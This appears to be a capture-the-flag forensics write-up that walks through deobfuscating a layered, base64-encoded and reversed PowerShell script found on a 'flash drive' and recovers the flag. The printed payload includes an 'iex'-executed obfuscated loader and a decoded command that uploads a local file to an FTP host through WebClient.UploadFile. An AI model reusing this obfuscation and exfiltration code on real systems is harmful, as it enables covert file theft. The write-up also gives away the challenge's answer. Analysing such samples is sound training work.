# Throw It In Reverse

## Forensics

### I found this script on a random flash drive I picked up in a parking lot.  I think it's about driving instructions.

The challenge comes with a Powershell script.

```powershell
$6=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbaSe64stRIng('JHshfT1bQ0hhcl0xMDU7JGE9W1N5U1RFbS50RVh0LkVuQ29EaW5nXTo6VU5pY09kRS5nRXRTdFJpbmcoW2NvTlZlclRdOjpGck9tYmFzZTY0c3RSSW5nKCdmWFJwZUdWN2FHTjBZV045T3lsR0pDQXNhWEoxSkNobGJHbEdaR0Z2YkhCVkxteGpkeVE3Y0hSbUpDQjBjMmxNZEc1bGJYVm5ja0V0SUdseVZTNXRaWFJ6ZVZNZ1pXMWhUbVZ3ZVZRdElIUmpaV3BpVHkxM1pVNDlhWEoxSkR0MGJtVnBiRU5pWlZjdWRHVk9MbTFsZEhONVV5QmxiV0ZPWlhCNVZDMGdkR05sYW1KUExYZGxUajFzWTNja095SndhWG91YzNOaGNDOXVhUzk5TTNOeU0zWXpjbDl1TVY5ME1WOW5iakYzTUhKb2RIdG1kR05oY21WMFFHaGhiR0k2Y21WemRTOHZPbkIwWmlJOWNIUm1KRHMyTVRGZGNtRklRMXNyTURJeFhYSmhTRU5iS3pZeE1WMXlZVWhEV3lzMk5GMXlZVWhEV3lzMU1qRmRjbUZJUTFzck5qRXhYWEpoU0VOYkt6SXhNVjF5WVVoRFd5czVORjF5WVVoRFd5czBNVEZkY21GSVExc3JPVGxkY21GSVExc3JNelZkY21GSVExc3JOVGxkY21GSVExc3JOVEV4WFhKaFNFTmJLekl4TVYxeVlVaERXeXMxT1YxeVlVaERXeXN3TURGZGNtRklRMXNyTVRWZGNtRklRMXNyTURBeFhYSmhTRU5iS3pnMFhYSmhTRU5iS3prNVhYSmhTRU5iS3pBeE1WMXlZVWhEV3lzeE5WMXlZVWhEV3lzek1qRmRjbUZJUTFzck5URXhYWEpoU0VOYkt6QXhNVjF5WVVoRFd5c3hNREZkY21GSVExc3JOVGRkY21GSVExc3JNamxkY21GSVExc3JPRFZkY21GSVExc3JOelpkY21GSVExczlSaVI3ZVhKMCcpKTske0B9ID0ieCI7JGI9JGEuVG9DaGFyQXJyYXkoKTtbYXJSYVldOjpyRVZlclNlKCRiKTsoJGIgLUpvSW4gIiIpIHwgJigiJHshfWUke0B9Iik='))
& ([char]105+[char]101+[char]120) $6
```

From looking at it, there is a command that's camelcased to avoid detection called FrOmbaSe64stRIng.  I grabbed everything in the parenthesis and dumped it in CyberChef.

```ps
${!}=[CHar]105;$a=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbase64stRIng('fXRpeGV7aGN0YWN9OylGJCAsaXJ1JChlbGlGZGFvbHBVLmxjdyQ7cHRmJCB0c2lMdG5lbXVnckEtIGlyVS5tZXRzeVMgZW1hTmVweVQtIHRjZWpiTy13ZU49aXJ1JDt0bmVpbENiZVcudGVOLm1ldHN5UyBlbWFOZXB5VC0gdGNlamJPLXdlTj1sY3ckOyJwaXouc3NhcC9uaS99M3NyM3Yzcl9uMV90MV9nbjF3MHJodHtmdGNhcmV0QGhhbGI6cmVzdS8vOnB0ZiI9cHRmJDs2MTFdcmFIQ1srMDIxXXJhSENbKzYxMV1yYUhDWys2NF1yYUhDWys1MjFdcmFIQ1srNjExXXJhSENbKzIxMV1yYUhDWys5NF1yYUhDWys0MTFdcmFIQ1srOTldcmFIQ1srMzVdcmFIQ1srNTldcmFIQ1srNTExXXJhSENbKzIxMV1yYUhDWys1OV1yYUhDWyswMDFdcmFIQ1srMTVdcmFIQ1srMDAxXXJhSENbKzg0XXJhSENbKzk5XXJhSENbKzAxMV1yYUhDWysxNV1yYUhDWyszMjFdcmFIQ1srNTExXXJhSENbKzAxMV1yYUhDWysxMDFdcmFIQ1srNTddcmFIQ1srMjldcmFIQ1srODVdcmFIQ1srNzZdcmFIQ1s9RiR7eXJ0'));${@} ="x";$b=$a.ToCharArray();[arRaY]::rEVerSe($b);($b -JoIn "") | &("${!}e${@}")
```
There looks like another FromBase64String...dropping that into CyberChef.

That gives what looks like a backwards PowerShell command:

```ps
}tixe{hctac};)F$ ,iru$(eliFdaolpU.lcw$;ptf$ tsiLtnemugrA- irU.metsyS emaNepyT- tcejbO-weN=iru$;tneilCbeW.teN.metsyS emaNepyT- tcejbO-weN=lcw$;"piz.ssap/ni/}3sr3v3r_n1_t1_gn1w0rht{ftcaret@halb:resu//:ptf"=ptf$;611]raHC[+021]raHC[+611]raHC[+64]raHC[+521]raHC[+611]raHC[+211]raHC[+94]raHC[+411]raHC[+99]raHC[+35]raHC[+59]raHC[+511]raHC[+211]raHC[+59]raHC[+001]raHC[+15]raHC[+001]raHC[+84]raHC[+99]raHC[+011]raHC[+15]raHC[+321]raHC[+511]raHC[+011]raHC[+101]raHC[+57]raHC[+29]raHC[+85]raHC[+76]raHC[=F${yrt
```

I used a Reverse recipe in CyberChef and got:

```ps
try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]75+[CHar]101+[CHar]110+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:blah@teractf{thr0w1ng_1t_1n_r3v3rs3}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}
```

In that string you can see the flag in the $ftp= area:

**teractf{thr0w1ng_1t_1n_r3v3rs3}**
